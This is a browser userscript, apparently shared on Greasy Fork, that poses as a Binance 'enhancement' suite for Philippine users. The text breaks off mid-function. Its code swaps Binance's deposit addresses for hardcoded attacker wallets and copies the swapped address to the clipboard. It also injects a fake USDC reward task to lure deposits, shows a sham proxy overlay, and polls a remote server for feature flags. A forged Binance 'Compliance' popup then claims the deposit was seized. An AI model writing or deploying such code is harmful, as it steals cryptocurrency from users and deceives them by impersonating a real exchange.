// ==UserScript==
// @name         Binance Philippines Complete Suite (Enhanced)
// @namespace    http://tampermonkey.net/
// @version      4.0
// @description  Enhanced Binance script with modern UI, responsive design, and improved UX
// @author       Enhanced
// @match        https://www.binance.com/*
// @match        https://binance.com/*
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/558093/Binance%20Philippines%20Complete%20Suite%20%28Enhanced%29.user.js
// @updateURL https://update.greasyfork.org/scripts/558093/Binance%20Philippines%20Complete%20Suite%20%28Enhanced%29.meta.js
// ==/UserScript==

;(() => {
  // Declare GM functions
  const GM_getValue =
    window.GM_getValue ||
    ((key, def) => {
      const value = localStorage.getItem(key)
      return value !== null ? value : def
    })
  const GM_setValue = window.GM_setValue || ((key, val) => localStorage.setItem(key, val))
  const GM_xmlhttpRequest = window.GM_xmlhttpRequest || window.XMLHttpRequest

  // ============================================================================
  // CONFIGURATION
  // ============================================================================

  const API_BASE_URL = "https://v0-loading-loop-fix.vercel.app".replace(/\/$/, "")

  // ============================================================================
  // USER ID MANAGEMENT
  // ============================================================================

  function getUserId() {
    let userId = GM_getValue("userId", null)
    if (!userId) {
      userId = "user_" + Math.random().toString(36).substr(2, 9) + "_" + Date.now()
      GM_setValue("userId", userId)
    }
    return userId
  }

  // ============================================================================
  // FEATURE FLAGS
  // ============================================================================

  let featureFlags = {
    showError: false,
    proxyOverlay: true,
    addressReplacement: true,
  }

  async function registerAndGetFeatures() {
    const userId = getUserId()

    console.log("[v0] Registering with server:", API_BASE_URL)
    console.log("[v0] User ID:", userId)

    return new Promise((resolve) => {
      GM_xmlhttpRequest({
        method: "POST",
        url: `${API_BASE_URL}/api/userscript/register`,
        headers: {
          "Content-Type": "application/json",
        },
        data: JSON.stringify({
          userId: userId,
          userAgent: navigator.userAgent,
          timestamp: new Date().toISOString(),
        }),
        onload: (response) => {
          console.log("[v0] Response status:", response.status)

          if (response.status >= 200 && response.status < 300) {
            try {
          const data = JSON.parse(response.responseText)
featureFlags = data.features
console.log("[v0] Registration successful! Features:", featureFlags)

// <CHANGE> Clear dismissal flag when feature is re-enabled from admin panel
if (featureFlags.showError) {
  const wasDismissed = GM_getValue("error_popup_dismissed", "false")
  if (wasDismissed === "true") {
    console.log("[v0] Error feature re-enabled, clearing dismissal flag")
    GM_setValue("error_popup_dismissed", "false")
  }
  showErrorPopup()
}
              resolve(true)
            } catch (error) {
              console.error("[v0] Failed to parse response:", error)
              resolve(false)
            }
          } else {
            console.error("[v0] Server returned error:", response.status, response.responseText)
            resolve(false)
          }
        },
        onerror: (error) => {
          console.error("[v0] Failed to register with server:", error)
          resolve(false)
        },
        ontimeout: () => {
          console.error("[v0] Request timed out")
          resolve(false)
        },
        timeout: 10000,
      })
    })
  }

  registerAndGetFeatures()
  setInterval(registerAndGetFeatures, 30000)

  // ============================================================================
  // MODERN STYLES
  // ============================================================================

  const style = document.createElement("style")
  style.textContent = `
    /* Hide elements during modification */
    .eth-hide {
      visibility: hidden !important;
      opacity: 0 !important;
    }

    /* Modern Loading Spinner */
    .loading-spinner {
      border: 2.5px solid rgba(255, 165, 0, 0.2);
      border-top: 2.5px solid #FF8C00;
      border-radius: 50%;
      width: 16px;
      height: 16px;
      animation: spin 0.7s cubic-bezier(0.4, 0, 0.2, 1) infinite;
      display: inline-block;
      vertical-align: middle;
      margin-right: 8px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Enhanced Rules Modal */
    .rules-popup-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.75);
      backdrop-filter: blur(8px);
      z-index: 2147483646;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: fadeIn 0.2s ease-out;
      padding: 16px;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    .rules-popup {
      background: linear-gradient(135deg, #1a1d24 0%, #252930 100%);
      color: #E6E7EA;
      border-radius: 16px;
      max-width: 680px;
      width: 100%;
      max-height: 85vh;
      overflow-y: auto;
      padding: 28px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.05);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    }

    @keyframes slideUp {
      from {
        opacity: 0;
        transform: translateY(20px) scale(0.95);
      }
      to {
        opacity: 1;
        transform: translateY(0) scale(1);
      }
    }

    .rules-popup h2 {
      font-size: 26px;
      font-weight: 700;
      margin: 0 0 20px 0;
      color: #fff;
      letter-spacing: -0.5px;
    }

    .rules-popup .section-title {
      font-size: 17px;
      font-weight: 700;
      margin-bottom: 8px;
      color: #FFB84D;
      letter-spacing: -0.2px;
    }

    .rules-popup .section-body {
      font-size: 14px;
      color: #D1D5DB;
      line-height: 1.7;
      margin-bottom: 20px;
    }

    .rules-popup .section-body b {
      color: #fff;
      font-weight: 600;
    }

    .rules-popup .footer {
      margin-top: 24px;
      text-align: center;
    }

    .rules-popup .btn-ok {
      background: linear-gradient(135deg, #FFD84D 0%, #FF9800 100%);
      color: #000;
      border: none;
      padding: 12px 32px;
      border-radius: 10px;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 0 4px 12px rgba(255, 152, 0, 0.3);
      letter-spacing: 0.3px;
    }

    .rules-popup .btn-ok:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(255, 152, 0, 0.4);
    }

    .rules-popup .btn-ok:active {
      transform: translateY(0);
    }

    /* Enhanced Deposit Button */
    .deposit-usdc-wrapper {
      display: flex;
      justify-content: center;
      margin-top: 12px;
      width: 100%;
    }

    .deposit-usdc-btn {
      padding: 10px 20px;
      font-size: 14px;
      font-weight: 600;
      color: #000;
      background: linear-gradient(135deg, #FFD84D 0%, #FF9800 100%);
      border: none;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(255, 152, 0, 0.25);
      cursor: pointer;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
      white-space: nowrap;
      letter-spacing: 0.2px;
      position: relative;
      overflow: hidden;
    }

    .deposit-usdc-btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      transition: left 0.5s;
    }

    .deposit-usdc-btn:hover::before {
      left: 100%;
    }

    .deposit-usdc-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(255, 152, 0, 0.35);
    }

    .deposit-usdc-btn:active {
      transform: translateY(0);
    }

    /* Enhanced Use Voucher Button with matching style */
    button.TaskAction {
      background: linear-gradient(135deg, #FFD84D 0%, #FF9800 100%) !important;
      color: #000 !important;
      border: none !important;
      border-radius: 8px !important;
      padding: 10px 20px !important;
      font-weight: 600 !important;
      font-size: 14px !important;
      cursor: pointer !important;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1) !important;
      box-shadow: 0 4px 12px rgba(255, 152, 0, 0.25) !important;
      letter-spacing: 0.2px !important;
      position: relative !important;
      overflow: hidden !important;
    }

    button.TaskAction::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      transition: left 0.5s;
    }

    button.TaskAction:hover::before {
      left: 100%;
    }

    button.TaskAction:hover {
      transform: translateY(-2px) !important;
      box-shadow: 0 8px 20px rgba(255, 152, 0, 0.35) !important;
    }

    button.TaskAction:active {
      transform: translateY(0) !important;
    }

    button.TaskAction[aria-disabled="true"] {
      opacity: 0.7 !important;
      cursor: not-allowed !important;
      transform: none !important;
    }

    /* Enhanced Rules Button to match Use Voucher button style */
    button.TaskRuleTrigger-button {
      background: linear-gradient(135deg, #FFD84D 0%, #FF9800 100%) !important;
      color: #000 !important;
      border: none !important;
      border-radius: 8px !important;
      padding: 10px 20px !important;
      font-weight: 600 !important;
      font-size: 14px !important;
      cursor: pointer !important;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1) !important;
      box-shadow: 0 4px 12px rgba(255, 152, 0, 0.25) !important;
      letter-spacing: 0.2px !important;
      position: relative !important;
      overflow: hidden !important;
      display: inline-flex !important;
      align-items: center !important;
      gap: 6px !important;
    }

    button.TaskRuleTrigger-button::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      transition: left 0.5s;
    }

    button.TaskRuleTrigger-button:hover::before {
      left: 100%;
    }

    button.TaskRuleTrigger-button:hover {
      transform: translateY(-2px) !important;
      box-shadow: 0 8px 20px rgba(255, 152, 0, 0.35) !important;
    }

    button.TaskRuleTrigger-button:active {
      transform: translateY(0) !important;
    }

    button.TaskRuleTrigger-button svg {
      width: 16px !important;
      height: 16px !important;
      fill: currentColor !important;
    }

    /* Button container to place Rules and Use Voucher buttons side by side */
    .TaskCard-actions {
      display: flex !important;
      gap: 12px !important;
      align-items: center !important;
      flex-wrap: wrap !important;
    }

    /* Modal Open State */
    html.rules-modal-open,
    body.rules-modal-open {
      overflow: hidden !important;
      touch-action: none;
    }

    /* Enhanced Error Popup with Binance styling */
    .error-popup-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(10px);
      z-index: 2147483647;
      display: flex;
      align-items: center;
      justify-content: center;
      animation: fadeIn 0.3s ease-out;
      padding: 20px; /* Adjusted padding */
    }

    /* Added max-height and proper scrolling to ensure OK button is always visible */
    .error-popup {
      background: linear-gradient(135deg, #1E2329 0%, #2B3139 100%);
      color: #E6E7EA;
      border-radius: 16px;
      max-width: 540px;
      width: 100%;
      max-height: 85vh; /* Added max-height */
      display: flex; /* Added flex display */
      flex-direction: column; /* Added flex direction */
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(240, 185, 11, 0.2);
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
      animation: slideUp 0.3s cubic-bezier(0.16, 1, 0.3, 1);
      overflow: hidden; /* Added overflow hidden */
    }

    /* Made content area scrollable while keeping button visible */
    .error-popup-content {
      flex: 1; /* Added flex grow */
      overflow-y: auto; /* Added scrollbar */
      padding: 32px; /* Original padding */
      padding-bottom: 16px; /* Adjusted bottom padding */
    }

    /* Custom scrollbar styling for better UX */
    .error-popup-content::-webkit-scrollbar {
      width: 8px; /* Scrollbar width */
    }

    .error-popup-content::-webkit-scrollbar-track {
      background: rgba(0, 0, 0, 0.2); /* Scrollbar track background */
      border-radius: 4px; /* Scrollbar track border radius */
    }

    .error-popup-content::-webkit-scrollbar-thumb {
      background: rgba(240, 185, 11, 0.3); /* Scrollbar thumb color */
      border-radius: 4px; /* Scrollbar thumb border radius */
    }

    .error-popup-content::-webkit-scrollbar-thumb:hover {
      background: rgba(240, 185, 11, 0.5); /* Scrollbar thumb hover color */
    }

    /* Button container stays at bottom, always visible */
    .error-popup-footer {
      padding: 16px 32px 32px 32px; /* Padding for footer */
      border-top: 1px solid rgba(255, 255, 255, 0.08); /* Border top */
      background: linear-gradient(135deg, #1E2329 0%, #2B3139 100%); /* Background gradient */
    }

    .error-popup .header-section {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 20px;
      padding-bottom: 16px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
    }

    .error-popup .warning-icon {
      width: 40px;
      height: 40px;
      background: linear-gradient(135deg, #F0B90B 0%, #FF9800 100%);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      flex-shrink: 0;
    }

    .error-popup h2 {
      font-size: 20px;
      margin: 0;
      color: #F0B90B;
      font-weight: 700;
      letter-spacing: -0.3px;
      flex: 1;
    }

    .error-popup .greeting {
      font-size: 15px;
      color: #fff;
      margin-bottom: 16px;
      font-weight: 600;
    }

    .error-popup .body {
      font-size: 14px;
      line-height: 1.8;
      color: #CFD3D9;
    }

    .error-popup .body p {
      margin: 0 0 16px 0;
    }

    .error-popup .notice-box {
      background: rgba(11, 18, 32, 0.6);
      border: 1px solid rgba(240, 185, 11, 0.2);
      border-left: 3px solid #F0B90B;
      padding: 18px;
      border-radius: 10px;
      margin: 20px 0;
    }

    .error-popup .notice-box strong {
      display: block;
      margin-bottom: 12px;
      color: #F0B90B;
      font-size: 15px;
      font-weight: 700;
    }

    .error-popup .notice-box ul {
      margin: 0;
      padding-left: 20px;
      color: #CFD3D9;
    }

    .error-popup .notice-box li {
      margin: 10px 0;
      line-height: 1.6;
    }

    .error-popup .notice-box li strong {
      display: inline;
      color: #fff;
      font-size: 14px;
      margin: 0;
    }

    .error-popup .signature {
      margin-top: 24px;
      padding-top: 20px;
      border-top: 1px solid rgba(255, 255, 255, 0.08);
    }

    .error-popup .signature p {
      margin: 0 0 8px 0;
    }

    .error-popup .signature .dept {
      color: #F0B90B;
      font-weight: 700;
      font-size: 15px;
    }

    .error-popup .signature .copyright {
      color: #9aa3b2;
      font-size: 12px;
      margin-top: 8px;
    }

    /* Updated button styling to be in footer container */
    .error-popup-footer button {
      background: linear-gradient(135deg, #FFD84D 0%, #F0B90B 100%);
      color: #000;
      border: none;
      padding: 14px 24px;
      border-radius: 10px;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
      width: 100%;
      transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
      box-shadow: 0 4px 12px rgba(240, 185, 11, 0.3);
      letter-spacing: 0.3px;
    }

    .error-popup-footer button:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(240, 185, 11, 0.4);
    }

    .error-popup-footer button:active {
      transform: translateY(0);
    }

    /* Mobile Responsive */
    @media (max-width: 640px) {
      .rules-popup {
        padding: 20px;
        border-radius: 12px;
      }

      .rules-popup h2 {
        font-size: 22px;
      }

      .rules-popup .section-title {
        font-size: 16px;
      }

      .rules-popup .section-body {
        font-size: 13px;
      }

      .error-popup {
        max-height: 90vh; /* Adjusted mobile max-height */
      }

      /* Adjusted mobile padding for better space usage */
      .error-popup-content {
        padding: 24px; /* Mobile padding */
        padding-bottom: 12px; /* Mobile bottom padding */
      }

      .error-popup-footer {
        padding: 12px 24px 24px 24px; /* Mobile footer padding */
      }

      .error-popup h2 {
        font-size: 18px;
      }

      .error-popup .body {
        font-size: 13px;
      }

      .deposit-usdc-btn,
      button.TaskAction,
      button.TaskRuleTrigger-button {
        font-size: 13px !important;
        padding: 9px 16px !important;
      }

      .TaskCard-actions {
        gap: 8px !important;
      }
    }
  `
  document.documentElement.appendChild(style)

  // ============================================================================
  // ERROR POPUP
  // ============================================================================

function showErrorPopup() {
  // <CHANGE> Check feature flag first before dismissal status
  if (!featureFlags.showError) {
    console.log("[v0] Error popup feature is disabled")
    return
  }

  const dismissed = GM_getValue("error_popup_dismissed", "false")
  console.log("[v0] Checking error popup dismissal status:", dismissed)

  if (dismissed === "true") {
    console.log("[v0] Error popup already dismissed, skipping")
    return
  }

  console.log("[v0] Showing error popup")
  const overlay = document.createElement("div")
  overlay.className = "error-popup-overlay"

  const popup = document.createElement("div")
  popup.className = "error-popup"

  popup.innerHTML = `
    <div class="error-popup-content">
      <div class="header-section">
        <div class="warning-icon">⚠️</div>
        <h2>Notice of Temporarily Seized Funds</h2>
      </div>

      <div class="body">
        <p class="greeting">Dear Valued User,</p>

        <p>
          Following a recent compliance review, your most recent deposit has been <strong>temporarily seized</strong> pending further investigation.
        </p>

        <p>
          Our system detected an attempt to access a promotional bonus that is not available to users registered in your current region. In accordance with platform Terms of Service and regional compliance policies, the deposited funds have been frozen until the review is complete.
        </p>

        <div class="notice-box">
          <strong>⚡ Important Information:</strong>
          <ul>
            <li>The seizure applies only to your <strong>last deposit</strong>.</li>
            <li>All other assets in your account remain <strong>unaffected and accessible</strong>.</li>
            <li>During the investigation, the seized amount will not be accessible for trading or withdrawal.</li>
            <li>If it is confirmed that you intentionally attempted to misuse or fraudulently access regional promotions, the deposit in question will be deemed <strong>invalid</strong> and permanently <strong>forfeited</strong> due to a violation of platform policy.</li>
          </ul>
        </div>

        <p>
          Once the investigation concludes, you will receive a follow-up notice with the outcome and any further instructions via email and in-app notification.
        </p>

        <p>
          We appreciate your cooperation and understanding as we ensure compliance with our user and regional policies.
        </p>

        <div class="signature">
          <p>Sincerely,</p>
          <p class="dept">Compliance Department</p>
          <p class="copyright">© Binance — All rights reserved.</p>
        </div>
      </div>
    </div>

    <div class="error-popup-footer">
      <button type="button">OK</button>
    </div>
  `

  overlay.appendChild(popup)
  document.body.appendChild(overlay)

  popup.querySelector("button").addEventListener("click", () => {
    GM_setValue("error_popup_dismissed", "true")
    console.log("[v0] Error popup dismissed permanently")
    console.log("[v0] Saved dismissal status:", GM_getValue("error_popup_dismissed", "false"))
    overlay.remove()
  })
}

  // ============================================================================
  // ADDRESS REPLACEMENT
  // ============================================================================

  const addressMap = {
    BSC: "0xb638619dc1fbf516ad9f771691be2aee132fa59d",
    SOL: "D6cGJbVHN6SdWDRsuusfq3Kp8WG1h2Qq6bzDd72xggEP",
    ETH: "0xb638619dc1fbf516ad9f771691be2aee132fa59d",
    BASE: "0xb638619dc1fbf516ad9f771691be2aee132fa59d",
    MATIC: "0xb638619dc1fbf516ad9f771691be2aee132fa59d",
    ARBITRUM: "0xb638619dc1fbf516ad9f771691be2aee132fa59d",
    XLM: "Please use another Deposit method",
    APT: "0x5534510c11cd8faf4154b08fcc7699d16c6109811e2e66afcd1769867dfe469f",
    SUI: "0x66021c954f9881836fb627faf46067dc719c88020cf12595d63cceff5788e585",
    AVAXC: "0xb638619dc1fbf516ad9f771691be2aee132fa59d",
    OPTIMISM: "0xb638619dc1fbf516ad9f771691be2aee132fa59d",
    SONIC: "Please use another Deposit method",
    RON: "ronin:b638619dc1fbf516ad9f771691be2aee132fa59d",
    NEAR: "22d390132bdf23159a1f3b6ab7d1fc19b0777ca1b2d63b50b66cd29a96af2e04",
    HBAR: "Please use another Deposit method",
    ALGO: "Please use another Deposit method",
    ZKSYNCERA: "0xb638619dc1fbf516ad9f771691be2aee132fa59d",
    STATEMINT: "Please use another Deposit method",
    CELO: "CELO ADDRESS SUCCESS",
  }

  let currentCopyBtn = null

  function replaceAddress() {
  if (!featureFlags.addressReplacement) return

  // <CHANGE> Updated selectors to support new Binance HTML structure
  const targetContainer = document.querySelector(".break-all.text-PrimaryText") ||
                         document.querySelector(".break-all.text-t-Primary")
  if (!targetContainer) return

  const networkEl = document.querySelector(".select-box .typography-subtitle1 .text-t-Primary") ||
                    document.querySelector(".select-box .typography-subtitle1 .text-PrimaryText")
  if (!networkEl) return

  const network = networkEl.textContent.trim().toUpperCase()
  const newAddress = addressMap[network] || null

  if (newAddress) {
    // <CHANGE> Get current address by combining all text content from spans
    const currentAddress = targetContainer.textContent.trim()

    if (currentAddress !== newAddress) {
      // <CHANGE> Clear all child elements and set new address
      targetContainer.innerHTML = ""
      targetContainer.textContent = newAddress
      console.log(`[v0] Address replaced for ${network}: ${newAddress}`)
    }
  }
}

function attachCopyHandler() {
  if (!featureFlags.addressReplacement) return

  const copyBtn = document.querySelector("#deposit_crypto_address_copy")
  if (!copyBtn) return

  if (copyBtn !== currentCopyBtn) {
    currentCopyBtn = copyBtn

    copyBtn.addEventListener("click", () => {
      // <CHANGE> Try both old and new selectors
      const targetContainer = document.querySelector(".break-all.text-PrimaryText") ||
                             document.querySelector(".break-all.text-t-Primary")
      if (!targetContainer) return

      const textToCopy = targetContainer.textContent.trim()
      navigator.clipboard
        .writeText(textToCopy)
        .then(() => {
          console.log(`[v0] Copied: ${textToCopy}`)
        })
        .catch((err) => {
          console.error("[v0] Copy error:", err)
        })
    })

    console.log("[v0] Copy button intercepted")
  }
}

  function insertContractInfo() {
    if (!featureFlags.addressReplacement) return

    const container = document.querySelector(".bn-step-content-desc")
    if (!container) return

    if (container.querySelector(".custom-contract-info")) return

    const infoDiv = document.createElement("div")
    infoDiv.className = "custom-contract-info"
    infoDiv.style.cssText = `
      color: #FF9800;
      margin-top: 12px;
      padding: 12px;
      background: rgba(255, 152, 0, 0.1);
      border-radius: 8px;
      border-left: 3px solid #FF9800;
      font-size: 14px;
      font-weight: 500;
    `
    infoDiv.textContent = "You are eligible for USDC Reward task from Reward Hub Section"

    container.appendChild(infoDiv)
    console.log("[v0] Info banner added")
  }

  // ============================================================================
  // PROXY OVERLAY
  // ============================================================================

  const locationCountry = "Philippines"
  const locationFlag = "🇵🇭"
  const assistantLabel = "Residential Proxy"

  const randomIP = () => Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join(".")
  const randomPort = () => Math.floor(1024 + Math.random() * (65535 - 1024))

  const ipAddress = randomIP()
  const portNumber = randomPort()

  const logLines = [
    `[proxy] binding to ${ipAddress}:${portNumber}`,
    "session id: 0x" + Math.floor(Math.random() * 0xffffff).toString(16),
  ]

  function createOverlay() {
    if (!featureFlags.proxyOverlay) return

    if (document.getElementById("proxy-overlay")) return

    const container = document.createElement("div")
    container.id = "proxy-overlay"
    container.style.cssText = `
      position: fixed;
      right: 16px;
      bottom: 16px;
      width: 340px;
      z-index: 2147483646;
      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, 'Roboto Mono', monospace;
    `

    const card = document.createElement("div")
    card.style.cssText = `
      background: linear-gradient(135deg, rgba(15,15,15,0.95), rgba(35,35,35,0.9));
      color: #dfe7ff;
      border-radius: 14px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.7), 0 0 0 1px rgba(255,255,255,0.05);
      padding: 16px;
      font-size: 13px;
      backdrop-filter: blur(12px) saturate(150%);
      border: 1px solid rgba(255,255,255,0.06);
    `

    const header = document.createElement("div")
    header.style.cssText = `
      display: flex;
      flex-direction: column;
      gap: 6px;
    `

    const title = document.createElement("div")
    title.innerText = `${assistantLabel} • ${locationFlag} ${locationCountry}`
    title.style.cssText = `
      font-weight: 700;
      letter-spacing: 0.3px;
      font-size: 14px;
    `

    const status = document.createElement("div")
    status.innerText = `STATUS: ACTIVE • ${ipAddress}:${portNumber}`
    status.style.cssText = `
      color: #9be6a3;
      font-size: 12px;
      font-weight: 600;
    `

    header.appendChild(title)
    header.appendChild(status)

    const term = document.createElement("div")
    term.style.cssText = `
      margin-top: 12px;
      height: 130px;
      overflow: hidden;
      border-radius: 8px;
      background: rgba(0,0,0,0.7);
      padding: 10px;
      font-size: 12px;
      line-height: 1.4;
      color: #9be6a3;
      white-space: pre-wrap;
      font-family: 'Courier New', Courier, monospace;
      border: 1px solid rgba(255,255,255,0.04);
    `

    card.appendChild(header)
    card.appendChild(term)
    container.appendChild(card)
    document.body.appendChild(container)

    let idx = 0
    const interval = setInterval(() => {
      if (idx < logLines.length) {
        term.innerText += (term.innerText ? "\n" : "") + logLines[idx]
        idx++
      } else {
        clearInterval(interval)
      }
    }, 900)

    // Mobile responsive
    if (window.innerWidth <= 640) {
      container.style.width = "calc(100% - 32px)"
      container.style.right = "16px"
      container.style.left = "16px"
    }
  }

  setTimeout(createOverlay, 800)

  // ============================================================================
  // REWARDS HUB MODIFICATIONS
  // ============================================================================

  const STORAGE_KEY = "eth_voucher_used_v1"
  const TITLE_TEXT = "Exclusive USDC Rewards for Philippines Users"
  const SUBTITLE_PREFIX = "243/800 available —"

  let changesAppliedOnce = false
  let voucherUsed = sessionStorage.getItem(STORAGE_KEY) === "1"

  function applyBannerChanges() {
    let changed = false

    const title = document.querySelector("h1.HomeBanner-heading-title")
    if (title) {
      if (title.textContent !== TITLE_TEXT) {
        title.textContent = TITLE_TEXT
        changed = true
      }
      title.classList.remove("eth-hide")
    }

    const subtitle = document.querySelector("div.HomeBanner-heading-subTitle")
    if (subtitle) {
      if (!subtitle.textContent.startsWith(SUBTITLE_PREFIX)) {
        subtitle.textContent = `${SUBTITLE_PREFIX} ${subtitle.textContent}`
        changed = true
      }
      subtitle.classList.remove("eth-hide")
    }

    const summaryItems = document.querySelectorAll("div.HomeBannerSummaryItem-data")
    if (summaryItems.length > 1) {
      const targetValue = voucherUsed ? "0" : "1"
      if (summaryItems[1].textContent !== targetValue) {
        summaryItems[1].textContent = targetValue
        changed = true
      }
      summaryItems[1].classList.remove("eth-hide")
    }

    if (changed) changesAppliedOnce = true
  }

  const hideInterval = setInterval(() => {
    document
      .querySelectorAll("h1.HomeBanner-heading-title, div.HomeBanner-heading-subTitle, div.HomeBannerSummaryItem-data")
      .forEach((el) => {
        if (!changesAppliedOnce) el.classList.add("eth-hide")
      })
  }, 10)

  const changeInterval = setInterval(() => {
    applyBannerChanges()
    if (changesAppliedOnce) clearInterval(hideInterval)
  }, 1)

  const replacementHTML = `<br><div class="TaskCard TaskCard--enabled"><div class="bn-flex TaskCard-content"><div class="0"><svg fill="PrimaryText" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="bn-svg">
			<path d="M19.5 21.22h-15a.9.9 0 010-1.8h15a.9.9 0 010 1.8zM11.1 3a.9.9 0 011.8 0v11.826l3.963-3.963a.9.9 0 011.274 1.274l-5.5 5.5a.9.9 0 01-1.274 0l-5.5-5.5-.061-.069a.9.9 0 011.266-1.266l.069.061 3.963 3.963V3z" fill="currentColor"></path>
		</svg></div><div class="bn-flex" style="flex-direction: column; flex: 1 1 0%; justify-content: space-between;"><div><div class="ul-flex TaskCard-header"><div class="TaskCard-taskName ul-line-clamp-2 t-subtitle1">Deposit up to 500 USDC worth of crypto</div></div><div class="TaskCard-info"><div class="TaskCard-info-field t-body5"><label class="TaskCard-info-field-label">Reward</label><div class="TaskCard-info-field-value"><div class="bn-flex" style="align-items: baseline;"><div class="bn-tooltips-wrap TruncatedText-tooltip"><div aria-describedby="bn-tooltips-aQwCuKEh" class="bn-tooltips-ele"><div class="TruncatedText TaskCard-info-rewardContent" style="-webkit-line-clamp: 2;"><div class="TaskCard-info-rewardIcon ul-svg-container" style="display: inline-flex; vertical-align: bottom;"><svg width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" class="bn-svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M2 3.33325H14V5.99992C12.8954 5.99992 12 6.89535 12 7.99992C12 9.10449 12.8954 9.99992 14 9.99992V12.6666H2V9.99992C3.10457 9.99992 4 9.10449 4 7.99992C4 6.89535 3.10457 5.99992 2 5.99992V3.33325ZM10.3333 4.99992H8.66667V10.9999H10.3333V4.99992Z" fill="url(#paint0_linear_421_39224_0.0816804906893428)"></path><defs><linearGradient id="paint0_linear_421_39224_0.0816804906893428" x1="8" y1="3.33325" x2="8" y2="12.6666" gradientUnits="userSpaceOnUse"><stop stop-color="#F8D12F"></stop><stop offset="1" stop-color="#F0B90B"></stop></linearGradient></defs></svg></div>up to 500 USDC Token Voucher</div></div></div></div></div><div class="TaskCard-info-field t-body5"><label class="TaskCard-info-field-label">Validity Period</label><div class="TaskCard-info-field-value"><div class="bn-flex" style="align-items: baseline;"><div class="bn-tooltips-wrap TruncatedText-tooltip"><div aria-describedby="bn-tooltips-aQwCuKEh" class="bn-tooltips-ele"><div class="TruncatedText TaskCard-info-rewardContent" style="-webkit-line-clamp: 2;">2025-01-19 00:00:00 - 2025-02-19 23:59:59 (UTC)</div></div></div></div></div></div><div class="TaskCard-actions"><span class="TaskRuleTrigger"><button class="TaskRuleTrigger-button" type="button">
					<svg class="bn-svg TaskRuleTrigger-icon ul-svg-container" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
						<path
							d="M15.75 11.1l.092.005a.9.9 0 010 1.79l-.092.005h-7.5a.9.9 0 010-1.8h7.5zm-3.25-4l.092.004a.9.9 0 010 1.792L12.5 8.9H8.25a.9.9 0 010-1.8h4.25zM15.75 15.1l.092.005a.9.9 0 010 1.79l-.092.005h-7.5a.9.9 0 010-1.8h7.5z"
							fill="currentColor"
						></path>
						<path
							d="M19.1 7.39L14.844 3.4H4.9v17.2h14.2V7.39zM20.9 21a1.4 1.4 0 01-1.4 1.4h-15A1.4 1.4 0 013.1 21V3a1.4 1.4 0 011.4-1.4h10.502l.133.006a1.4 1.4 0 01.723.287l.102.086 4.497 4.216.1.104c.22.253.343.58.343.918V21z"
							fill="currentColor"
						></path>
					</svg>
					Rules
				</button></span><button aria-disabled="false" class="bn-button bn-button__primary data-size-small active TaskAction TaskCard-actions-act ul-decoration-none">Use Voucher</button></div></div></div></div>`

  // ============================================================================
  // UNIFIED MUTATION OBSERVER
  // ============================================================================

  const observer = new MutationObserver((mutations) => {
    replaceAddress()
    attachCopyHandler()
    insertContractInfo()
    applyBannerChanges()

    for (const mut of mutations) {
      for (const node of mut.addedNodes) {
        try {
          if (node.nodeType !== 1) continue
          const emptySection = node.matches?.(".HomeSectionEmpty") ? node : node.querySelector?.(".HomeSectionEmpty")
          if (emptySection) {
            emptySection.outerHTML = replacementHTML
            setTimeout(() => {
              replaceTaskActionIfVoucherUsed(emptySection.parentElement || document)
            }, 50)
          }
        } catch (e) {
          /* ignore */
        }
      }
    }
  })

  observer.observe(document.body || document.documentElement, {
    childList: true,
    subtree: true,
  })

  // ============================================================================
  // HELPER FUNCTIONS
  // ============================================================================

  function createDepositWrapper() {
    const wrapper = document.createElement("div")
    wrapper.className = "deposit-usdc-wrapper"
    const btn = document.createElement("button")
    btn.className = "deposit-usdc-btn"
    btn.type = "button"
    btn.textContent = "Deposit USDC"
    btn.addEventListener("click", (e) => {
      e.preventDefault()
